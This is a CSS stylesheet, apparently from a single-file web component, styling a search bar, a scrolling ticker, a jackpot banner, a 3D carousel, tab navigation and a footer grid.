@media screen and (max-width: 480px) {
  .search {
    width: 100%;
  }
}
search .grayscale {
  filter: grayscale(100%);
}

.selected-category img {
  filter: grayscale(0%);
}

.active-border {
  border-bottom: 4px solid var(--ci-primary-opacity-color);
}

.selected-category p {
  border-bottom: 4px solid var(--ci-primary-opacity-color);
}

.scrolling-text-container {
  overflow: hidden;
  white-space: nowrap;
  width: 100%;
  box-sizing: border-box;
  padding: 0 2.5rem;
}

.scrolling-text {
  display: inline-block;
  padding-left: 100%;
  animation: scroll 25s linear infinite;
}

.jackpot_rox {
  position: relative;
  display: none;
}

.jackpot_rox img {
  width: 100%;
  height: auto;
}

.jackpot_text {
  position: absolute;
  top: 45%;
  left: 50%;
  transform: translate(-50%, -50%);
  font-size: 1.9rem;
  font-weight: 600;
  color: var(--ci-gray-light);
  text-shadow: 2px 2px 4px rgba(255, 255, 255, 0.5);
}

@media screen and (max-width: 480px) {
  .jackpot_rox {
    display: inline-block !important;
    width: 100%;
  }
}

.pulser {
  animation: pulse 1s ease infinite;
}

@keyframes pulse {
  0% {
    transform: scale(1);
  }

  50% {
    transform: scale(1.1);
  }

  100% {
    transform: scale(1);
  }
}

@keyframes scroll {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(-100%);
  }
}
.hover-text {
  transition: 1s ease;
}
.hover-text:hover {
  cursor: crosshair;
}

.scroll-container {
  max-height: 180px;
  overflow-x: auto;
  overflow-y: hidden;
  scrollbar-width: none;
}

.scroll-container::-webkit-scrollbar {
  display: none;
}

.w-33 {
  height: auto;
}

/* CARROUSSEL */

.carousel__slide {
  padding: 10px;
}

.carousel__prev {
  left: -40px;
}

.carousel__next {
  right: -40px;
}

.carousel__prev,
.carousel__next {
  border-radius: 50%;
  font-weight: 900;
}

.carousel__pagination-button.carousel__pagination-button--active:after {
  background: #dddde5 !important;
  width: 15px !important;
}

.carousel__pagination-button:after {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  text-align: center;
  box-sizing: border-box;
  display: inline-block;
  cursor: pointer;
  background: #b6b5c78d;
  height: 4px;
  width: 4px;
  border-radius: 4px;
  margin: 0 4px;
}

.carousel__pagination-button {
  --vc-pgn-margin: 0;
  padding: 0 !important;
}

.carousel__pagination {
  position: relative;
  bottom: 0 !important;
  margin-bottom: 25px;
}

@media (max-width: 1000px) {
  .carousel__viewport {
    perspective: 2000px;
  }

  .carousel__track {
    transform-style: preserve-3d;
  }

  .carousel__slide--sliding {
    transition: 0.5s;
  }

  .carousel__slide {
    opacity: 0.9;
    transform: rotateY(-20deg) scale(0.9);
  }

  .carousel__slide--active ~ .carousel__slide {
    transform: rotateY(20deg) scale(0.9);
  }

  .carousel__slide--prev {
    opacity: 1;
    transform: rotateY(-10deg) scale(0.95);
  }

  .carousel__slide--next {
    opacity: 1;
    transform: rotateY(10deg) scale(0.95);
  }

  .carousel__slide--active {
    opacity: 1;
    transform: rotateY(0) scale(1.1);
  }
}

/* END CARROUSSEL */

.is-active {
  color: #fff !important;
  background: #3c3754;
  border-radius: 20px;
  border: 1px solid rgba(85, 84, 103, 0.4);
}

.el-tabs__item {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  user-select: none;
  box-sizing: border-box;
  -webkit-box-pack: center;
  justify-content: center;
  list-style: none;
  font-size: 14px;
  font-weight: 500;
  position: relative;
  white-space: nowrap;
  -webkit-box-flex: initial;
  flex: initial;
  color: #b6b5c7;
  height: 30px;
  margin-right: 16px;
  padding: 0 12px;
  display: flex;
  -webkit-box-align: center;
  align-items: center;
}

.el-tabs__active-bar {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  white-space: nowrap;
  box-sizing: border-box;
  position: absolute;
  bottom: 0;
  left: 0;
  height: 2px;
  background-color: #409eff;
  z-index: 1;
  transition: width 2 cubic-bezier(0.645, 0.045, 0.355, 1),
    transform 2 cubic-bezier(0.645, 0.045, 0.355, 1),
    -webkit-transform 2 cubic-bezier(0.645, 0.045, 0.355, 1);
  list-style: none;
  display: none;
  width: 115px;
  transform: translateX(12px);
}

.el-tabs__nav {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  white-space: nowrap;
  position: relative;
  transition: transform 2, -webkit-transform 2;
  float: left;
  z-index: calc(var(--el-index-normal) + 1);
  display: flex;
  -webkit-box-align: center;
  align-items: center;
  transform: translateX(0px);
}

.el-tabs__nav-scroll {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  overflow: hidden;
}

.el-tabs__nav-wrap {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  overflow: hidden;
  margin-bottom: -1px;
  position: relative;
}

.el-tabs__header {
  color-scheme: light;
  font-family: Montserrat-Medium, Montserrat-Bold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  color: #b6b5c7;
  user-select: none;
  box-sizing: border-box;
  position: relative;
  margin: 0 0 15px;
  background: #201d2e;
  border-radius: 16px;
  padding: 12px 8px;
  margin-bottom: 8px;
}

.text-section {
  font-style: italic;
  font-weight: 400;
  font-size: 20px;
  line-height: 24px;
  text-transform: capitalize;
  color: #b6b5c7;
}

.right-arrow-box {
  margin-left: 4px;
  width: 24px;
  height: 24px;
  border-radius: 24px;
  color: #b6b5c7;
  background: rgba(44, 41, 63, 0.5);
}

.i-cross {
  cursor: pointer;
  right: 16px;
  font-size: 18px;
  color: #eee;
}

.alert-btn-1 {
  padding: 5px 12px;
  margin-right: 8px;
  text-align: center;
  color: #fff;
  background: rgba(255, 255, 255, 0.4);
  border-radius: 99px;
  cursor: pointer;
}

.partner-box {
  margin-top: 24px;
}

.title {
  margin-bottom: 24px;
  font-style: italic;
  font-weight: 800;
  font-size: 20px;
  color: #b6b5c7;
}

.con-box {
  display: grid;
  gap: 12px;
  grid-template-columns: repeat(6, auto);
}

.con-item {
  background: #2d2941;
  border-radius: 8px;
  height: 72px;
}

.btn {
  display: flex;
  justify-content: center;
  align-items: center;
}

.gong-neng {
  text-align: center;
  margin-top: 28px;
  display: grid;
  grid-template-columns: repeat(6, auto);
}

.gong-neng-item {
  margin-bottom: 20px;
}

.website-box {
  line-height: 18px;
  padding: 16px 0;
  color: #555467;
  font-size: 14px;
}

.page-to {
  margin-bottom: 40px;
  margin-top: 30px;
  display: grid;
  grid-template-columns: repeat(3, auto);
  font-size: 16px;
}

.foot-right {
  padding-top: 40px;
  border-top: 1px solid #333;
  color: #555467;
}
</style>
